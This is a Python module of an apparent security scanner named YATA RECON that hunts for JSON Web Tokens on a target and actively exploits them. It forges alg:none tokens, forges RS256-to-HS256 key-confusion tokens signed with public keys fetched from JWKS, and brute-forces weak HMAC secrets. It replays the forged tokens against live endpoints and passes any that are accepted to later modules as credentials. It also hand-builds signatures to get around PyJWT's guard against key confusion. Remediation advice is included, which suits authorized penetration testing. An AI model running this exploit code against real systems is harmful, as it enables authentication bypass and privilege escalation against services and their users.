"""
JWTModule — YATA RECON module.
Analyzes JSON Web Tokens (JWT) for security misconfigurations, and actively
attempts to exploit them (not just report the static config):
  - alg:none forgery, resubmitted against the endpoint that issued the token
  - weak/default HMAC secret brute-force (cryptographic proof via PyJWT,
    no live request needed — a successful local verify IS the exploit)
  - RS256->HS256 key-confusion: discover the RSA public key via JWKS, then
    forge an HS256 token HMAC-signed with that public key's PEM bytes as the
    "secret" — servers that pass the same public key into verification
    without pinning the expected algorithm accept it as genuine.
"""
import re
import json
import base64
import hmac
import hashlib
import urllib.parse

try:
    import requests
except ImportError:
    requests = None

try:
    import jwt as pyjwt
    from jwt.algorithms import RSAAlgorithm
except ImportError:
    pyjwt = None
    RSAAlgorithm = None

try:
    from cryptography.hazmat.primitives import serialization
except ImportError:
    serialization = None

from recon.modules import BaseModule


# Common locations for a JWKS (JSON Web Key Set) document, plus OpenID
# Connect discovery (which itself points at the real jwks_uri).
JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/.well-known/openid-configuration",
    "/jwks.json",
    "/oauth/jwks",
    "/oauth2/jwks",
    "/auth/jwks",
    "/.well-known/jwks",
    "/api/jwks.json",
]


# Small set of textbook-weak / commonly-forgotten-default HMAC secrets.
# Deliberately short — this is a misconfiguration check, not a real
# brute-force attack against a production secret.
WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "jwt_secret",
    "your-256-bit-secret", "key", "test", "admin", "qwerty",
]


class JWTModule(BaseModule):
    NAME = "JWT Analysis"

    JWT_REGEX = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'

    def run(self):
        self.ui.section("JWT — JSON Web Token Security Analysis")
        if not requests:
            return

        # JWTs discovered from previous scans, mapped to the endpoint that
        # returned them so exploit attempts can be resubmitted there.
        jwt_sources = {}  # token -> endpoint

        self.session = self._session()
        endpoints = [self.base_url] + self.ctx.get("endpoints", [])[:10]

        for endpoint in endpoints:
            try:
                resp = self.session.get(endpoint, timeout=self.timeout)
                for match in re.finditer(self.JWT_REGEX, resp.text):
                    jwt_sources.setdefault(match.group(0), endpoint)
                for k, v in resp.headers.items():
                    for match in re.finditer(self.JWT_REGEX, v):
                        jwt_sources.setdefault(match.group(0), endpoint)
            except Exception:
                pass

        if not jwt_sources:
            self.ui.info("No JWT tokens discovered.")
            return

        self.ui.info(f"Discovered {len(jwt_sources)} JWT(s) for analysis.")

        self._jwks_cache = None  # fetched lazily, once, only if an RS*-alg token is actually seen

        for token, endpoint in jwt_sources.items():
            self._analyze_jwt(token, endpoint)

    def _pad_base64(self, data: str) -> str:
        """Add padding to base64 string if necessary."""
        return data + '=' * (4 - len(data) % 4)

    def _b64url_nopad(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode().rstrip("=")

    def _forge_none_alg(self, payload: dict) -> str:
        """Build an alg:none JWT: {header}.{payload}. with an empty signature."""
        header_b64 = self._b64url_nopad(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        payload_b64 = self._b64url_nopad(json.dumps(payload).encode())
        return f"{header_b64}.{payload_b64}."

    def _forge_hs256_with_key(self, payload: dict, key_bytes: bytes, kid: str | None = None) -> str:
        """
        Build an HS256 JWT HMAC-signed with `key_bytes` as the raw secret —
        the actual RS256->HS256 key-confusion primitive. Deliberately NOT
        built via pyjwt.encode(): recent PyJWT versions detect a
        PEM-looking key passed for an HMAC algorithm and raise
        InvalidKeyError as a footgun-prevention measure for legitimate
        developers — which would silently block this module from ever
        sending the forged payload at all. That guard describes OUR local
        PyJWT install, not whether the TARGET's JWT library (which may be
        an older PyJWT, a Java/Node/Ruby library, or anything else) is
        actually vulnerable, so the forged token is constructed by hand
        with the same raw HMAC-SHA256(key, header.payload) computation a
        vulnerable verifier performs.
        """
        header = {"alg": "HS256", "typ": "JWT"}
        if kid:
            header["kid"] = kid
        header_b64 = self._b64url_nopad(json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = self._b64url_nopad(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{header_b64}.{payload_b64}".encode()
        signature = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
        sig_b64 = self._b64url_nopad(signature)
        return f"{header_b64}.{payload_b64}.{sig_b64}"

    def _try_none_alg_exploit(self, token: str, payload: dict, endpoint: str):
        """Forge an alg:none token and resubmit it — does the server actually accept it?"""
        forged = self._forge_none_alg(payload)
        try:
            real_resp   = self.session.get(endpoint, timeout=self.timeout,
                                            headers={"Authorization": f"Bearer {token}"})
            forged_resp = self.session.get(endpoint, timeout=self.timeout,
                                            headers={"Authorization": f"Bearer {forged}"})
            noauth_resp = self.session.get(endpoint, timeout=self.timeout)
        except Exception:
            return None

        # The endpoint has to actually behave differently with vs without a
        # token for this to mean anything (otherwise it may not even be
        # checking auth on this endpoint, or the string we found isn't a
        # real session token at all).
        token_matters = (
            real_resp.status_code != noauth_resp.status_code
            or abs(len(real_resp.text) - len(noauth_resp.text)) > max(30, len(noauth_resp.text) * 0.05)
        )
        if not token_matters:
            return None

        forged_matches_real = (
            forged_resp.status_code == real_resp.status_code
            and abs(len(forged_resp.text) - len(real_resp.text)) <= max(30, len(real_resp.text) * 0.05)
        )
        if forged_matches_real:
            return forged
        return None

    # ── RS256 -> HS256 key confusion ────────────────────────────────────────
    def _discover_jwks(self, endpoint: str):
        """Find and parse a JWKS document. Tries well-known paths on the
        target itself, following an OpenID Connect discovery doc's
        `jwks_uri` if that's what we land on instead. Cached for the whole
        module run — JWKS almost never differs per-endpoint on one target."""
        if self._jwks_cache is not None:
            return self._jwks_cache

        parsed = urllib.parse.urlparse(endpoint if "://" in endpoint else self.base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        keys = []
        for path in JWKS_PATHS:
            url = urllib.parse.urljoin(origin, path)
            try:
                resp = self.session.get(url, timeout=self.timeout)
            except Exception:
                continue
            if resp.status_code != 200:
                continue
            try:
                data = resp.json()
            except Exception:
                continue
            if not isinstance(data, dict):
                continue

            if "keys" in data and isinstance(data["keys"], list):
                keys = data["keys"]
                break

            # OpenID Connect discovery doc — follow jwks_uri to the real set.
            jwks_uri = data.get("jwks_uri")
            if jwks_uri:
                try:
                    jresp = self.session.get(jwks_uri, timeout=self.timeout)
                    jdata = jresp.json()
                    if isinstance(jdata, dict) and isinstance(jdata.get("keys"), list):
                        keys = jdata["keys"]
                        break
                except Exception:
                    continue

        self._jwks_cache = keys
        return keys

    def _jwk_to_pem(self, jwk: dict):
        """Convert an RSA JWK (n, e) into the raw PEM bytes an attacker
        would use as the HMAC 'secret' in a key-confusion forgery — this IS
        the exploit primitive: the public key is, by design, public, so an
        attacker has exactly the same PEM bytes the server will compare
        against if it mishandles alg switching."""
        if not RSAAlgorithm or not serialization:
            return None
        if jwk.get("kty") != "RSA":
            return None
        try:
            pub_key = RSAAlgorithm.from_jwk(json.dumps(jwk))
            return pub_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        except Exception:
            return None

    def _try_key_confusion(self, token: str, header: dict, payload: dict, endpoint: str):
        """
        Forge alg=HS256 tokens HMAC-signed with each candidate RSA public
        key's PEM bytes, and resubmit — a live acceptance check, same
        pattern as _try_none_alg_exploit. A successful hit is fed straight
        into the credential-propagation pipeline (capture_credential) so
        every module running afterward gets to reuse the forged admin-grade
        token, same as a cracked SQLi auth-bypass would.
        """
        alg = header.get("alg", "").upper()
        if alg not in ("RS256", "RS384", "RS512") or not pyjwt or not RSAAlgorithm or not serialization:
            return None

        jwks = self._discover_jwks(endpoint)
        if not jwks:
            return None

        kid = header.get("kid")
        candidates = [k for k in jwks if k.get("kty") == "RSA"]
        if kid:
            # Try the matching kid first (most likely to be the actual
            # verification key) but fall back to trying all RSA keys in the
            # set — some deployments don't even check kid consistency.
            candidates.sort(key=lambda k: 0 if k.get("kid") == kid else 1)

        try:
            real_resp = self.session.get(endpoint, timeout=self.timeout,
                                          headers={"Authorization": f"Bearer {token}"})
            noauth_resp = self.session.get(endpoint, timeout=self.timeout)
        except Exception:
            return None

        token_matters = (
            real_resp.status_code != noauth_resp.status_code
            or abs(len(real_resp.text) - len(noauth_resp.text)) > max(30, len(noauth_resp.text) * 0.05)
        )
        if not token_matters:
            return None

        for jwk in candidates[:5]:
            pem = self._jwk_to_pem(jwk)
            if not pem:
                continue
            try:
                forged = self._forge_hs256_with_key(payload, pem, kid=jwk.get("kid"))
            except Exception:
                continue

            try:
                forged_resp = self.session.get(endpoint, timeout=self.timeout,
                                                headers={"Authorization": f"Bearer {forged}"})
            except Exception:
                continue

            forged_matches_real = (
                forged_resp.status_code == real_resp.status_code
                and abs(len(forged_resp.text) - len(real_resp.text)) <= max(30, len(real_resp.text) * 0.05)
            )
            if forged_matches_real:
                return forged
        return None

    def _try_weak_secret(self, token: str, alg: str):
        """Cryptographically verify the signature against a small list of
        default/weak secrets. A successful decode IS the proof — no live
        request needed."""
        if not pyjwt or alg not in ("HS256", "HS384", "HS512"):
            return None
        for secret in WEAK_SECRETS:
            try:
                # We're proving the SIGNATURE matches a weak secret, not that
                # the token is currently usable — don't let an expired `exp`
                # mask a correctly-guessed secret.
                pyjwt.decode(token, secret, algorithms=[alg], options={"verify_exp": False})
                return secret
            except Exception:
                continue
        return None

    def _analyze_jwt(self, token: str, endpoint: str):
        parts = token.split('.')
        if len(parts) != 3:
            return

        try:
            # Decode Header
            header_b64 = self._pad_base64(parts[0])
            header_json = base64.urlsafe_b64decode(header_b64).decode('utf-8')
            header = json.loads(header_json)

            # Decode Payload
            payload_b64 = self._pad_base64(parts[1])
            payload_json = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
            payload = json.loads(payload_json)
        except Exception:
            return

        alg = header.get('alg', '').upper()

        # 1. alg:none forgery — actively exploited, not just detected. Runs
        # regardless of the token's own declared alg (this is the attacker
        # changing the header, not reading what's already there).
        accepted_forgery = self._try_none_alg_exploit(token, payload, endpoint)
        if accepted_forgery:
            self.db.add(
                title="JWT — 'alg:none' Forgery Accepted By Server",
                severity="critical", url=endpoint, module=self.NAME,
                description=(
                    "A forged JWT with header {\"alg\":\"none\"} and an empty signature, built "
                    "from this token's own payload, was accepted by the server as equivalent to "
                    "the original signed token. Anyone can forge arbitrary claims (e.g. admin=true) "
                    "with zero cryptographic knowledge."
                ),
                remediation="Explicitly reject 'none' as an accepted algorithm in the JWT verification library config. Pin the expected algorithm(s) server-side instead of trusting the token's own 'alg' header.",
                cvss="9.8",
                confidence="CONFIRMED",
                confidence_score=98,
                validation_steps=["jwt_parsed", "forged_none_alg_resubmitted", "server_accepted_forgery"],
                evidence=[f"Forged token: {accepted_forgery}", f"Tested against: {endpoint}"],
            )
            self.ui.find("critical", "JWT alg:none Forgery Accepted", endpoint)
            self.capture_credential("bearer", accepted_forgery, source=f"{self.NAME} (alg:none forgery)")
        elif alg == 'NONE':
            # The token as originally issued already declares alg:none —
            # a real red flag on its own even though our live resubmission
            # above couldn't independently confirm impact at this endpoint.
            self.db.add(
                title="JWT — 'none' Algorithm In Issued Token",
                severity="critical", url=endpoint, module=self.NAME,
                description=(
                    "A token issued by the application itself uses the 'none' algorithm, "
                    "meaning it carries no cryptographic integrity protection at all — anyone "
                    "who can see one such token can forge arbitrary others."
                ),
                remediation="Reject JWTs with the 'none' algorithm. Always enforce signature verification.",
                cvss="9.1",
                confidence="HIGH",
                confidence_score=80,
                validation_steps=["jwt_parsed", "alg_none_in_issued_token"]
            )
            self.ui.find("critical", "JWT 'none' Algorithm", endpoint)

        # 1a. RS256 -> HS256 key confusion — forge with the RSA public key
        # (fetched from JWKS) used as an HMAC secret, resubmitted live.
        confused_token = self._try_key_confusion(token, header, payload, endpoint)
        if confused_token:
            self.db.add(
                title="JWT — RS256→HS256 Key-Confusion Accepted By Server",
                severity="critical", url=endpoint, module=self.NAME,
                description=(
                    f"This {alg} token's RSA public key was fetched from a discovered JWKS "
                    "endpoint and used to HMAC-sign a forged alg=HS256 token. The server "
                    "accepted it as valid — it's verifying the signature with the same key "
                    "material regardless of which algorithm the token's header claims, so "
                    "anyone who can fetch the (public, by design) JWKS can forge arbitrary "
                    "tokens with any claims, including elevated privileges."
                ),
                remediation=(
                    "Never let the token's own 'alg' header select the verification algorithm. "
                    "Pin the expected algorithm explicitly server-side (e.g. "
                    "jwt.decode(token, key, algorithms=['RS256']) — an explicit allow-list, not "
                    "whatever the token claims)."
                ),
                cvss="9.8",
                confidence="CONFIRMED",
                confidence_score=98,
                validation_steps=["jwks_discovered", "rsa_public_key_extracted",
                                   "hs256_forged_with_public_key", "server_accepted_forgery"],
                evidence=[f"Forged token: {confused_token}", f"Tested against: {endpoint}"],
            )
            self.ui.find("critical", "JWT RS256→HS256 Key Confusion Accepted", endpoint)
            # Feed the propagation pipeline (core/modules/__init__.py) — every
            # module running afterward automatically reuses this forged
            # token, same as a cracked SQLi auth-bypass credential would.
            self.capture_credential("bearer", confused_token, source=f"{self.NAME} (key confusion)")

        # 1b. Weak/default HMAC secret — cryptographic proof via PyJWT.
        weak_secret = self._try_weak_secret(token, alg)
        if weak_secret:
            self.db.add(
                title=f"JWT — Weak HMAC Secret ('{weak_secret}')",
                severity="critical", url=endpoint, module=self.NAME,
                description=(
                    f"This {alg} token's signature verifies successfully against the common "
                    f"default/weak secret '{weak_secret}'. Anyone who knows this secret can "
                    "forge arbitrary valid tokens, including elevated-privilege claims."
                ),
                remediation="Use a long, random, unique HMAC secret (32+ bytes from a CSPRNG), or switch to asymmetric signing (RS256/ES256) if the secret must be shared across services.",
                cvss="9.8",
                confidence="CONFIRMED",
                confidence_score=99,
                validation_steps=["jwt_parsed", "hmac_signature_verified_with_known_secret"],
                evidence=[f"Secret: {weak_secret}"],
            )
            self.ui.find("critical", f"JWT Weak HMAC Secret: {weak_secret}", endpoint)
            # The cracked secret makes this a fully attacker-forgeable token
            # (and the original is itself a proven-valid live credential) —
            # feed it forward so downstream modules scan authenticated.
            self.capture_credential("bearer", token, source=f"{self.NAME} (weak HMAC secret '{weak_secret}')")
        elif not pyjwt and alg in ("HS256", "HS384", "HS512"):
            self.ui.warn("PyJWT not installed — skipping weak-HMAC-secret check (pip install pyjwt)")

        # 2. Check for missing expiration
        if 'exp' not in payload:
            self.db.add(
                title="JWT — Missing Expiration (exp) Claim",
                severity="medium", url=endpoint, module=self.NAME,
                description="The JWT payload does not contain an 'exp' claim. The token never expires.",
                remediation="Include a short-lived 'exp' claim in all JWTs.",
                cvss="5.3",
                confidence="HIGH",
                confidence_score=85,
                validation_steps=["jwt_parsed", "exp_missing"]
            )
            self.ui.find("medium", "JWT Missing exp claim", endpoint)

        # 3. Check for sensitive data in payload
        sensitive_keys = ['password', 'pwd', 'ssn', 'credit_card', 'secret', 'key']
        found_sensitive = [k for k in payload.keys() if any(sk in k.lower() for sk in sensitive_keys)]

        if found_sensitive:
            # List which keys carry sensitive data, not their raw values —
            # dumping the actual payload here would re-leak the very secrets
            # this finding is warning about into our own report output.
            self.db.add(
                title="JWT — Sensitive Data in Payload",
                severity="high", url=endpoint, module=self.NAME,
                description=(
                    f"The JWT payload contains potentially sensitive fields: {', '.join(found_sensitive)}. "
                    "JWT payloads are base64 encoded, not encrypted, and can be read by anyone."
                ),
                remediation="Never store sensitive information in JWT payloads. Use opaque tokens if necessary.",
                cvss="7.4",
                confidence="HIGH",
                confidence_score=90,
                validation_steps=["jwt_parsed", "sensitive_keys_matched"],
                evidence=[f"Sensitive field name(s) found: {', '.join(found_sensitive)}"]
            )
            self.ui.find("high", "JWT Sensitive Data Exposure", endpoint)
